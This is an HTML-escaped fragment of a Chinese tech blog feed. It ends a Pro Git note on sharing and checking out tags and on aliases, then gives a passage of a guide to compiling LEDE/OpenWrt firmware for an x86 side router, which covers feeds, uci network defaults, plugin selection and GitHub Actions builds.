Date:   Mon Feb 9 15:32:16 2009 &lt;span class=&quot;nt&quot;&gt;-0800&lt;/span&gt;

version 1.2
commit 9fceb02d0ae598e95dc970b74767f19372d61af8
Author: Magnus Chacon &amp;lt;mchacon@gee-mail.com&amp;gt;
Date:   Sun Apr 27 20:43:35 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    updated rakefile
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;共享标签&quot;&gt;共享标签&lt;/h3&gt;
&lt;p&gt;默认情况下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git push&lt;/code&gt; 命令不会推送标签到远程服务器。可以显式的将标签推送到共享服务器：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin v1.5
Counting objects: 14, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Delta compression using up to 8 threads.
Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;12/12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Writing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14/14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 2.05 KiB | 0 bytes/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Total 14 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
To git@github.com:schacon/simplegit.git
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;new tag]         v1.5 -&amp;gt; v1.5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果需要一次推送多个标签，可以使用带有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--tags&lt;/code&gt; 选项的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git push&lt;/code&gt; 命令。这将会把所有不在远程仓库服务器上的标签全部推送过去。&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin &lt;span class=&quot;nt&quot;&gt;--tags&lt;/span&gt;
Counting objects: 1, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Writing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1/1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 160 bytes | 0 bytes/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Total 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
To git@github.com:schacon/simplegit.git
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;new tag]         v1.4 -&amp;gt; v1.4
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;new tag]         v1.4-lw -&amp;gt; v1.4-lw
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;检出标签&quot;&gt;检出标签&lt;/h3&gt;
&lt;p&gt;在 Git 中并不能真正的检出一个标签。因为标签不能像分支一样来回移动。如果需要工作目录与仓库中特定的标签版本完全一样，可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git checkout -b [branchname] [tagname]&lt;/code&gt; 在特定的标签上创建一个新分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; version2 v2.0.0
Switched to a new branch &lt;span class=&quot;s1&quot;&gt;'version2'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当然，如果在这之后又进行了一次提交，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version2&lt;/code&gt; 分支会因为改动向前移动，那么 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;version2&lt;/code&gt; 分支就和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v2.0.0&lt;/code&gt; 标签有些不同了。&lt;/p&gt;

&lt;h2 id=&quot;git-别名&quot;&gt;Git 别名&lt;/h2&gt;

&lt;p&gt;Git 并不会在你输入部分命令时自动推断你想要的命令。如果不想每次输入完整的 Git 命令，可以通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git config&lt;/code&gt; 文件来为每个命令设置一个别名。比如：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; alias.br branch
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这意味着，当你需要输入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git commit&lt;/code&gt; 命令时，只需要输入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git ci&lt;/code&gt;。&lt;/p&gt;</content><author><name></name></author><category term="git" /><category term="github" /><category term="progit" /><category term="note" /><summary type="html">本部分涵盖 Git 使用中的各种基本命令，包括初始化仓库（repository）、开始或停止跟踪（track）文件、暂存（stage）或提交（commit）更改；配置 Git 来忽略指定的文件和文件模式、撤销错误操作、浏览项目的历史版本以及不同提交（commits）间的差异、推送（push）到远程仓库以及从远程仓库拉取（pull）文件等。</summary></entry><entry><title type="html">LEDE 旁路由 x86 固件定制记录</title><link href="https://blog.securitainment.io/lede/openwrt/2020/07/16/LEDE-Compile-Note.html" rel="alternate" type="text/html" title="LEDE 旁路由 x86 固件定制记录" /><published>2020-07-16T07:30:32+08:00</published><updated>2020-07-16T07:30:32+08:00</updated><id>https://blog.securitainment.io/lede/openwrt/2020/07/16/LEDE-Compile-Note</id><content type="html" xml:base="https://blog.securitainment.io/lede/openwrt/2020/07/16/LEDE-Compile-Note.html">&lt;p&gt;在使用了几年 Linksys WRT1200AC 安装 OpenWrt 固件，用来正常上网后，这两年手头需要正常上网的设备越来越多（Netflix、Apple TV+、美区 iCloud 同步等），终于感觉网速有点不够用了，于是在 NAS 的虚拟机里安装了 LEDE 作为旁路由。在连续多次编译了 lean 大佬的 lede 固件，尝试做到了对于&lt;strong&gt;单网口旁路由&lt;/strong&gt;来说使用最佳，然后记录了更方便进行再次编译的配置方式。&lt;/p&gt;

&lt;p&gt;下面通过本地编译开始，然后转移到使用 Github Action 自动编译，做到完全伸手可得。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;本地编译&quot;&gt;本地编译&lt;/h2&gt;
&lt;p&gt;这里先贴一下 Lean 大佬的 lede 源码仓库上说明的步骤：&lt;/p&gt;

&lt;h3 id=&quot;注意&quot;&gt;注意：&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;不要用 root 用户 git 和编译！！！&lt;/li&gt;
  &lt;li&gt;国内用户编译前最好准备好梯子&lt;/li&gt;
  &lt;li&gt;默认登陆 IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.1&lt;/code&gt;, 密码 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;编译命令如下&quot;&gt;编译命令如下：&lt;/h3&gt;
&lt;ol&gt;
  &lt;li&gt;首先装好 Ubuntu 64bit，推荐 Ubuntu 18 LTS x64&lt;/li&gt;
  &lt;li&gt;命令行输入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt-get -y update&lt;/code&gt; 更新系统软件源，然后输入命令安装依赖：
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch python3.5 python2.7 unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib antlr3 gperf wget swig
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git clone https://github.com/coolsnowwolf/lede&lt;/code&gt; 命令下载源代码，然后 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd lede&lt;/code&gt; 进入目录&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;进行完上面的步骤，就可以开始自定义自己需要的固件了：&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;启用-ssr-plus&quot;&gt;启用 SSR-Plus&lt;/h3&gt;
&lt;p&gt;编辑 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./feeds.conf.default&lt;/code&gt; 文件，取消注释 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#src-git helloworld https://github.com/fw876/helloworld&lt;/code&gt;，修改完成后该文件如下：&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;src-git packages https://github.com/coolsnowwolf/packages&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;src-git luci https://github.com/coolsnowwolf/luci&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;src-git routing https://git.openwrt.org/feed/routing.git&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;src-git telephony https://git.openwrt.org/feed/telephony.git&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;src-git freifunk https://github.com/freifunk/openwrt-packages.git&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#src-git video https://github.com/openwrt/video.git&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#src-git targets https://github.com/openwrt/targets.git&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#src-git management https://github.com/openwrt-management/packages.git&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#src-git oldpackages http://git.openwrt.org/packages.git&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#src-link custom /usr/src/openwrt/custom-feed&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;src-git helloworld https://github.com/fw876/helloworld&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;修改路由器固件的初始网络配置&quot;&gt;修改路由器固件的初始网络配置&lt;/h3&gt;
&lt;p&gt;原版固件的默认登录 IP 地址为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.1&lt;/code&gt;，如果刷完直接使用，一般会和家里的路由器 IP 地址冲突，这里修改一下。编辑 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./package/lean/default-settings/files/zzz-default-settings&lt;/code&gt; 文件，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit 0&lt;/code&gt; 这一行上面添加如下代码（我一般在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uci commit system&lt;/code&gt; 这一行后面添加）：&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;uci set network.lan.ipaddr='192.168.1.254'&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 默认 IP 地址&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.proto='static'&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 静态 IP&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.type='bridge'&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 桥接&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.ifname='eth0'&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 网络端口默认 eth0&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.netmask='255.255.255.0'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 子网掩码&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.gateway='192.168.1.1'&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 默认网关&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.dns='192.168.1.1'&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# 默认上游 DNS 地址&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci commit network&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;可选：在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uci commit system&lt;/code&gt; 这一行上面添加 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uci set system.@system[0].hostname=LEDE&lt;/code&gt; 来设置主机名为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LEDE&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;修改完成后 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./package/lean/default-settings/files/zzz-default-settings&lt;/code&gt; 文件部分如下：&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/bin/sh&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set luci.main.lang=zh_cn&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci commit luci&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set system.@system[0].timezone=CST-8&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set system.@system[0].zonename=Asia/Shanghai&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set system.@system[0].hostname=LEDE&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci commit system&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;uci set network.lan.ipaddr='192.168.1.254'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.proto='static'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.type='bridge'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.ifname='eth0'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.netmask='255.255.255.0'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.gateway='192.168.1.1'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci set network.lan.dns='192.168.1.1'&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uci commit network&lt;/span&gt;

&lt;span class=&quot;nn&quot;&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;接着输入编译命令&quot;&gt;接着输入编译命令&lt;/h3&gt;
&lt;p&gt;更新编译源，并进入配置界面：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./scripts/feeds update &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./scripts/feeds &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make menuconfig   &lt;span class=&quot;c&quot;&gt;# 进入配置界面&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;定制固件&quot;&gt;定制固件&lt;/h3&gt;
&lt;p&gt;这一步选择需要的插件：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如不需要 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automount/autosamba&lt;/code&gt; 功能（自动挂载 USB/samba 共享），需要在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extra-packages&lt;/code&gt; 菜单中取消选择 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automount&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autosamba&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;进入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Luci - Applications&lt;/code&gt; 选择需要的插件：&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# 我常用的几个，只做旁路由使用&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-firewall&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 防火墙和端口转发,必备&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-adbyby-plus&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# 广告屏蔽大师 Plus+&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-sfe&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# Turbo ACC 网络加速(开启 Fast Path 转发加速)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-unblockNeteaseMusic&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# 解锁网易云&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-ssr-plus&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 附加应用，按需选择&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-wol&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# 网络唤醒&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-accesscontrol&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 上网时间控制&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-arpbind&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# IP/MAC 绑定&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-autoreboot&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 计划重启&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-ddns&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 动态域名解析&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-filetransfer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 上传 ipk 文件功能&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-frpc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 内网穿透 Frp&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-ipsec-vpnd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# IPSec 服务端&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-nlbwmon&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 网络带宽监视器&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-ramfree&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 释放内存&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-rclone&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# rclone&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-samba&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 网络共享（samba）&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-upnp&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 通用即插即用 UPnP(端口自动转发)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-vlmcsd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# KMS 服务器（WIN 激活工具）&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-vsftpd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# FTP 服务器&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-webadmin&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# Web 管理页面设置&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-xlnetacc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 迅雷下载&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-zerotier&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 虚拟局域网&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-aria2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# Aria2 下载&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-hd-idle&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 硬盘休眠&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-mwan3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# MWAN 负载均衡&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-openvpn&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# OpenVPN 客户端&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-openvpn-server&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# OpenVPN 服务端&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-pptp-server&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# PPTP 服务端&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-sqm&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 流量智能队列管理(QOS)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-transmission&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# BT 下载&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-usb-printer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# USB 打印服务器&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-wireguard&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# VPN 服务器 WireGuard 状态&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;luci-app-wrtbwmon&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;	&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;# 实时流量监测&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;选择完成后 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Save&lt;/code&gt; 保存。&lt;/p&gt;

&lt;h3 id=&quot;继续编译命令&quot;&gt;继续编译命令&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make -j8 download V=s&lt;/code&gt; 下载dl库（国内请尽量全局科学上网）&lt;/li&gt;
  &lt;li&gt;输入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make -j1 V=s&lt;/code&gt; （&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-j1&lt;/code&gt; 后面数字&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;是线程数。第一次编译推荐用单线程）进行编译你要的固件。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;编译完成后固件在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./bin/targets/&lt;/code&gt; 文件夹内。&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;使用-github-的-action-功能自动编译&quot;&gt;使用 Github 的 Action 功能自动编译&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;参考&lt;a href=&quot;https://github.com/coolsnowwolf/lede/issues/2288&quot;&gt;【教程】会本地编译的情况下，怎么用GitHub Actions云编译？&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lede&lt;/code&gt; 自带的 Action 为例来修改。文件路径为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./.github/workflows/openwrt-ci.yml&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;提取本地自定义插件和默认配置的差异&quot;&gt;提取本地自定义插件和默认配置的差异&lt;/h3&gt;

&lt;p&gt;在上面本地编译时，当完成“选择完成后 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Save&lt;/code&gt; 保存。”后，会生成一个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.config&lt;/code&gt; 文件，此时运行下面命令来提取配置差异：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make defconfig
./scripts/diffconfig.sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; diff.config   &lt;span class=&quot;c&quot;&gt;# 将差异保存在 diff.config 文件中&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;在-openwrt-ciyml-中添加自定义配置&quot;&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openwrt-ci.yml&lt;/code&gt; 中添加自定义配置&lt;/h3&gt;
&lt;h4 id=&quot;启用-ssr-plus-1&quot;&gt;启用 SSR-Plus&lt;/h4&gt;

&lt;p&gt;修改 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opennwrt-ci.yml&lt;/code&gt; 的这一部分：&lt;/p&gt;

